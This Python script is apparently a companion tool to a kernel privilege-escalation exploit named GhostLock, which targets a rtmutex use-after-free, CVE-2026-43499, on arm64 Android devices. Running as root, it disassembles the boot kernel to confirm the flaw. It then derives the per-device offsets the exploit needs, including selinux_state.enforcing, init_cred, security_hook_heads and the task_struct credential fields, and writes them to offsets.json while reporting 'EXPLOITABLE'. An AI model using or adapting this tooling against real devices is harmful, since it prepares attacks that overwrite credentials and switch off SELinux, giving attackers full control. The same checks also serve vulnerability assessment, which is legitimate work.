#!/usr/bin/env python3
"""
verify_ghostlock.py — independently verify CVE-2026-43499 exploitability and
re-derive the GhostLock per-device offset table for THIS device.

Read-only. Runs as root on the device (or in a chroot over the same kernel).

Checks performed:
  1. Device / kernel identity (uname, config, SELinux, page size).
  2. CONFIG_FUTEX_PI / CONFIG_PREEMPT present (the only prerequisites).
  3. remove_waiter() built-in vulnerability signature by disassembling the
     LIVE kernel image straight out of the boot partition:
        vulnerable  <=> function body contains `mrs xN, sp_el0` (reads current)
        patched     <=> no such instruction (uses waiter->task)
     This is exactly the gate tools/extract_rs uses (CI rejects with exit 6).
  4. Symbol offsets rebased on _text, cross-checked against /proc/kallsyms.
  5. task_struct / cred / rt_mutex_waiter field offsets from
     /sys/kernel/btf/vmlinux (BTF), cross-checked against the compiler-
     generated immediate operands seen in the disassembly.
  6. Prints a ready-to-use offsets.json entry.

Usage:  sudo python3 verify_ghostlock.py [--boot /dev/block/by-name/boot_a]
"""
import argparse, hashlib, json, os, struct, subprocess, sys

IMAGE_BASE_VA = 0xffffffc080000000   # target.h KIMAGE_TEXT_BASE (6.x GKI/QCOM)
BASE_IMAGE_OFF = 0x1000              # arm64 Image header offset in boot.img

# ---------------------------------------------------------------- BTF parser
KIND_STRUCT, KIND_UNION = 4, 5

class Btf:
    def __init__(self, path="/sys/kernel/btf/vmlinux"):
        d = open(path, "rb").read()
        magic, ver, flags, hdr_len, toff, tlen, soff, slen = struct.unpack_from("<HBBIIIII", d, 0)
        if magic != 0xEB9F:
            raise SystemExit("not a BTF blob")
        self.types = d[hdr_len + toff:hdr_len + toff + tlen]
        self.strs = d[hdr_len + soff:hdr_len + soff + slen]
        self.by_name = {}
        self._walk()

    def _s(self, o):
        if not o:
            return ""
        e = self.strs.find(b"\0", o)
        return self.strs[o:e].decode("utf8", "replace")

    def _walk(self):
        t, off, tid = self.types, 0, 1
        while off < len(t):
            name_off, info, size = struct.unpack_from("<III", t, off)
            kind, vlen = (info >> 24) & 0x1F, info & 0xFFFF
            p, members = off + 12, []
            if kind in (KIND_STRUCT, KIND_UNION):
                for _ in range(vlen):
                    mo, mt, mb = struct.unpack_from("<III", t, p); p += 12
                    members.append({"name": self._s(mo), "type": mt, "bit_offset": mb})
            elif kind == 1:   p += 4
            elif kind in (6,): p += 8 * vlen
            elif kind == 19:  p += 12 * vlen
            elif kind == 3:   p += 12
            elif kind == 13:  p += 8 * vlen
            elif kind in (14, 17): p += 4
            elif kind == 15:  p += 12 * vlen
            if kind == KIND_STRUCT and self._s(name_off):
                self.by_name.setdefault(self._s(name_off), {"id": tid, "size": size, "members": members})
            off, tid = p, tid + 1

    def field(self, struct_name, member):
        r = self.by_name.get(struct_name)
        if not r:
            return None
        for m in r["members"]:
            if m["name"] == member:
                if m["bit_offset"] % 8:
                    return None
                return m["bit_offset"] // 8
        return None


def load_kallsyms():
    ks = {}
    for line in open("/proc/kallsyms"):
        p = line.split()
        if len(p) >= 3:
            try:
                ks.setdefault(p[2], int(p[0], 16))
            except ValueError:
                pass
    return ks


def carve_arm64_image(dev):
    """Return (bytes, file_offset_of_Image) for the kernel Image in a boot part."""
    with open(dev, "rb") as f:
        head = f.read(0x10000)
    # The arm64 Image header has the magic 0x644d5241 ("ARM\x64") at +0x38.
    magic = b"ARM\x64"
    idx = 0
    while True:
        i = head.find(magic, idx)
        if i < 0:
            raise SystemExit(f"no arm64 Image magic in {dev}")
        if i >= 0x38 and head[i - 0x38:i - 0x38 + 4] != b"ANDROID!":
            img = i - 0x38
            with open(dev, "rb") as f:
                f.seek(img)
                size = struct.unpack("<Q", head[img + 0x10:img + 0x18])[0]
                data = f.read(size if 0 < size < (1 << 30) else 64 << 20)
            return data, img
        idx = i + 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--boot", default="/dev/block/by-name/boot_a")
    ap.add_argument("--json", action="store_true", help="emit offsets.json entry")
    args = ap.parse_args()

    ok = True
    report = {}

    # ---- 1. identity
    rel = open("/proc/sys/kernel/osrelease").read().strip()
    ks = load_kallsyms()
    text = ks.get("_text")
    report["release"] = rel
    report["_text"] = hex(text) if text else None
    print(f"release           : {rel}")
    print(f"page size         : {os.sysconf('SC_PAGE_SIZE')}")
    print(f"_text             : {hex(text) if text else 'unreadable'}")

    try:
        enforce = open("/sys/fs/selinux/enforce").read().strip()
        print(f"selinux enforce   : {enforce}")
    except OSError:
        print("selinux enforce   : (unreadable)")
    try:
        cmd = open("/proc/cmdline").read()
        for tok in cmd.split():
            if tok.startswith("androidboot.selinux="):
                print(f"boot selinux      : {tok}")
    except OSError:
        pass

    # ---- 2. prerequisites
    cfg = b""
    if os.path.exists("/proc/config.gz"):
        import gzip
        cfg = gzip.open("/proc/config.gz", "rb").read()
    for opt in (b"CONFIG_FUTEX_PI=y", b"CONFIG_PREEMPT=y", b"CONFIG_FUTEX=y"):
        present = opt in cfg if cfg else None
        print(f"{opt.decode():<20}: {'yes' if present else ('no' if present is False else 'unknown')}")
        if cfg and not present:
            ok = False
            print(f"  !! {opt.decode()} missing -> not exploitable")

    # ---- 3. remove_waiter signature in the live image
    if not text:
        print("\n!! /proc/kallsyms does not expose _text; run as root.")
        return 1
    if "remove_waiter" not in ks:
        print("!! remove_waiter not in kallsyms")
        return 1
    try:
        img, img_off = carve_arm64_image(args.boot)
        print(f"\nkernel Image      : {len(img)} bytes @ boot+{img_off:#x}")
    except SystemExit as e:
        print(f"\n!! {e}")
        return 1

    shift = text - IMAGE_BASE_VA          # KASLR slide of this boot
    static_remove = ks["remove_waiter"] - shift
    foff = img_off + (static_remove - IMAGE_BASE_VA)
    body = img[foff:foff + 0x600]
    print(f"KASLR shift       : {shift:#x}")
    print(f"remove_waiter     : runtime={ks['remove_waiter']:#x} static={static_remove:#x} file={foff:#x}")

    # Disassemble with local objdump if available (aarch64-capable), else scan words.
    used_current = None
    if body:
        try:
            tmp = "/tmp/.rw.bin"
            open(tmp, "wb").write(body)
            dis = subprocess.run(["objdump", "-D", "-b", "binary", "-m", "aarch64",
                                  f"--adjust-vma={static_remove:#x}", tmp],
                                 capture_output=True, text=True, timeout=60).stdout
            used_current = "sp_el0" in dis
            mrs_line = next((l.strip() for l in dis.splitlines() if "sp_el0" in l), None)
        except Exception:
            dis, mrs_line = "", None
    # Raw-instruction fallback: `mrs xN, sp_el0` == 0xd5384100 | (N<<5)
    if used_current is None:
        words = struct.unpack_from(f"<{len(body)//4}I", body)
        hit = [w for w in words if (w & 0xFFFFFFE0) == 0xD5384100]
        used_current = bool(hit)
        mrs_line = f"word {hit[0]:#x}" if hit else None

    print(f"\nremove_waiter reads current (mrs sp_el0): {'YES' if used_current else 'NO'}")
    if mrs_line:
        print(f"  evidence: {mrs_line}")
    if used_current:
        print("  ==> VULNERABLE to CVE-2026-43499 (rtmutex remove_waiter UAF)")
    else:
        print("  ==> PATCHED (fix present); the exploit preflight rejects this kernel")
        ok = False
    report["vulnerable"] = bool(used_current)

    # ---- 4. symbol offsets
    syms = {}
    for n in ["init_task", "init_cred", "root_task_group", "selinux_blob_sizes",
              "security_hook_heads", "loggers", "nfulnl_logger", "sysctl_bootid"]:
        if n in ks:
            syms[n] = ks[n] - text
    # `enforcing` is the first field of `selinux_state` (offset 0), so the
    # struct's own address is what the exploit writes.
    selinux_enforcing = None
    if "selinux_state" in ks:
        selinux_enforcing = ks["selinux_state"] - text
    elif "selinux_enforcing" in ks:
        selinux_enforcing = ks["selinux_enforcing"] - text
    print("\nsymbol offsets (rebased on _text):")
    for k, v in syms.items():
        print(f"  {k:<24} {v:#010x}")
    print(f"  {'selinux_enforcing':<24} "
          + (f"{selinux_enforcing:#010x}  (selinux_state.enforcing @ +0)"
             if selinux_enforcing is not None
             else "(not exported; W1 offset must be confirmed by disassembly)"))

    # ---- 5. struct fields via BTF
    tf = {}
    try:
        b = Btf()
        taskmap = {
            "task_prio": "prio", "task_normal_prio": "normal_prio",
            "task_sched_task_group": "sched_task_group", "task_pi_lock": "pi_lock",
            "task_pi_waiters": "pi_waiters", "task_pi_top_task": "pi_top_task",
            "task_pi_blocked_on": "pi_blocked_on", "task_pid": "pid",
            "task_tgid": "tgid", "task_atomic_flags": "atomic_flags",
            "task_real_cred": "real_cred", "task_cred": "cred",
            "task_comm": "comm", "task_tasks": "tasks",
            "task_seccomp": "seccomp", "task_usage": "usage",
        }
        print("\ntask_struct fields (BTF /sys/kernel/btf/vmlinux):")
        for k, m in taskmap.items():
            v = b.field("task_struct", m)
            tf[k] = v
            print(f"  {k:<24} {m:<20} {v if v is None else hex(v)}")
        w = b.by_name.get("rt_mutex_waiter")
        c = b.by_name.get("cred")
        if w:
            print(f"\nrt_mutex_waiter size {w['size']:#x} (compact/flat layout if 0x58)")
        if c:
            print(f"cred size {c['size']:#x}; uid@{b.field('cred','uid'):#x} "
                  f"caps@{b.field('cred','cap_permitted'):#x} "
                  f"security@{b.field('cred','security'):#x}")
        # sanity: the compiler emitted &current->pi_lock as an immediate in the body
        import re
        imm = None
        if body:
            for w32 in struct.unpack_from(f"<{len(body)//4}I", body):
                # add xD, xN, #imm  (0x91...)
                if (w32 & 0xFFC00000) == 0x91000000 and ((w32 >> 22) & 0xFFF) == 0x884:
                    imm = 0x884
                    break
        if tf.get("task_pi_lock") is not None:
            print(f"  cross-check: pi_lock from BTF = {tf['task_pi_lock']:#x}"
                  + (f", disassembly immediate = {imm:#x}" if imm else ""))
    except Exception as e:
        print(f"\n!! BTF parse failed: {e}")

    # ---- 6. offsets.json (schema uses the off_* names from offsets_json.c)
    entry = {
        "release": rel,
        "kernel_phys_load": 0xA8000000,
        "pselect_waiter_shift": 0,
        "compact_waiter": 1,
        "mm_struct_sz": 0x400,
    }
    name_map = {
        "init_task": "off_init_task", "init_cred": "off_init_cred",
        "root_task_group": "off_root_task_group",
        "selinux_blob_sizes": "off_selinux_blob_sizes",
        "security_hook_heads": "off_security_hook_heads",
        # loggers[0][1] sits one pointer past loggers[0][0]
        "loggers": "off_slide_loggers_0_1",
        "nfulnl_logger": "off_slide_nfulnl_logger",
        "sysctl_bootid": "off_slide_boot_id",
    }
    for sym, key in name_map.items():
        if sym in syms:
            entry[key] = syms[sym] + (8 if key == "off_slide_loggers_0_1" else 0)
    if selinux_enforcing is not None:
        entry["off_selinux_enforcing"] = selinux_enforcing
    entry.update({k: v for k, v in tf.items() if v is not None})
    print("\n" + "=" * 62)
    print("offsets.json entry (verified):")
    print(json.dumps([entry], indent=2))
    print("=" * 62)
    if args.json:
        out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "offsets.json")
        with open(out, "w") as f:
            json.dump([entry], f, indent=2)
            f.write("\n")
        print(f"wrote {out}")
    print(f"\nRESULT: {'EXPLOITABLE / offsets verified' if ok else 'NOT EXPLOITABLE'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
